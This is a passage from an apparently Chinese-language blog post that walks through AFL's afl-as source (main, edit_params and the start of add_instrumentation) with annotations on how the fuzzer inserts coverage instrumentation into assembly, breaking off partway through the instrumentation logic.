<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc tmp.c -S tmp.S -O0 -fno-asynchronous-unwind-tables</span><br><span class="line">cc1: warning: tmp.S is shorter than expected</span><br><span class="line"><span class="comment"># 0 &quot;tmp.S&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span></span><br><span class="line"><span class="comment"># 0 &quot;&lt;command-line&gt;&quot; 2</span></span><br><span class="line"><span class="comment"># 1 &quot;tmp.S&quot;</span></span><br><span class="line"> .file <span class="string">&quot;tmp.c&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .section .rodata</span><br><span class="line">.LC0:</span><br><span class="line"> .string <span class="string">&quot;hello&quot;</span></span><br><span class="line"> .text</span><br><span class="line"> .globl main</span><br><span class="line"> .<span class="built_in">type</span> main, @<span class="keyword">function</span></span><br><span class="line">main:</span><br><span class="line"> pushq %rbp</span><br><span class="line"> movq %rsp, %rbp</span><br><span class="line"> leaq .LC0(%rip), %rax</span><br><span class="line"> movq %rax, %rdi</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> call <span class="built_in">printf</span>@PLT</span><br><span class="line"> movl <span class="variable">$0</span>, %eax</span><br><span class="line"> popq %rbp</span><br><span class="line"> ret</span><br><span class="line"> .size main, .-main</span><br><span class="line"> .ident <span class="string">&quot;GCC: (Debian 13.2.0-13) 13.2.0&quot;</span></span><br><span class="line"> .section .note.GNU-stack,<span class="string">&quot;&quot;</span>,@progbits</span><br></pre></td></tr></table></figure>

<p>在汇编过程插桩，得到不一样的汇编代码</p>
<p>afl-clang和afl-gcc存在一定的区别，但是原理类似</p>
<ul>
<li>llvm-mode</li>
</ul>
<h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p>afl-as的入口，几乎和afl-gcc差不多</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  clang_mode = !!<span class="built_in">getenv</span>(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据时间生成一个随机种子</span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">srandom</span>(rand_seed);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改参数</span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(AS_LOOP_ENV_VAR))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setenv</span>(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line">  <span class="comment">// 检查内存问题的参数</span></span><br><span class="line">  <span class="comment">// 在进行ASAN的编译时，AFL无法识别出ASAN特定的分支，导致插入很多无意义的桩代码，所以直接暴力地将插桩概率/3；</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 插桩核心代码</span></span><br><span class="line">  <span class="keyword">if</span> (!just_version) <span class="built_in">add_instrumentation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在子进程进行执行 afl-as</span></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 可以设置这个参数选择是否删除掉.S文件</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="edit-param-1"><a href="#edit-param-1" class="headerlink" title="edit param"></a>edit param</h3><p>还是afl-as参数的设置，这里已经被 afl-gcc 设置过一次</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 仍然是环境变量</span></span><br><span class="line">  u8 *tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获得一个 tmp 目录，生成中间文件</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">32</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置编译器参数</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line">	<span class="comment">// 64/32位</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">// 可能是文件名，需要处理</span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line">  <span class="comment">// -version</span></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) <span class="built_in">FATAL</span>(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在tmp目录下生成临时文件，会根据 AFL_KEEP_ASSEMBLY 选择删除</span></span><br><span class="line">  modified_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, <span class="built_in">getpid</span>(),</span><br><span class="line">                               (u32)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line">  <span class="comment">// 最后一个参数设置为/tmp/.afl-xxx.S </span></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>插桩代码，如果想要比较详细的理解，需要使用afl-gcc编译一下，使用<code>AFL_KEEP_ASSEMBLY</code>将汇编代码保存，或者使用IDA这样的反汇编工具打开二进制文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = <span class="built_in">fopen</span>(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = stdin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// modified_file 是    /tmp/.afl-xxx.s 汇编文件</span></span><br><span class="line">  outfd = <span class="built_in">open</span>(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = <span class="built_in">fdopen</span>(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) <span class="built_in">PFATAL</span>(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        instr_ok: 是否位于指令段中, eg:  .text</span></span><br><span class="line"><span class="comment">        skip_csect: 是否要跳过code section</span></span><br><span class="line"><span class="comment">        skip_next_label: 是否跳过对下一个标签的插桩</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        skip_intel: 是否为intel语法的汇编, afl-as不对intel汇编语法进行插桩, 会跳过</span></span><br><span class="line"><span class="comment">        skip_app: 是否遇到内联汇编, afl-as不对内联汇编插桩, 会跳过</span></span><br><span class="line"><span class="comment">        instrument_next: 表示已经遇到合适的标签, 需要在该标签的第一条指令前进行插桩.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代码段，x86还是x64</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两种汇编样式：intel和AT&amp;T，跳过intel格式汇编</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不用管，因为代表着注释</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at 